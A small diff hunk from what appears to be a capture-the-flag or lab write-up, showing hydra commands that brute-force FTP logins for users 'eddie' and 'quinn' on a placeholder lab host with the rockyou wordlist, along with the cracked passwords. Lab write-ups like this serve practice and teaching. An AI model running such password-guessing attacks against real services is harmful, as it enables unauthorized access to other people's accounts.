@@ -47,6 +47,7 @@ R= vsftpd 3.0.5
 
 hydra -l eddie -P /usr/share/wordlists/rockyou.txt ftp://machine_ip:10021
 password: jordan
+
 hydra -l quinn -P /usr/share/wordlists/rockyou.txt ftp://machine_ip:10021
 password: andrea
 
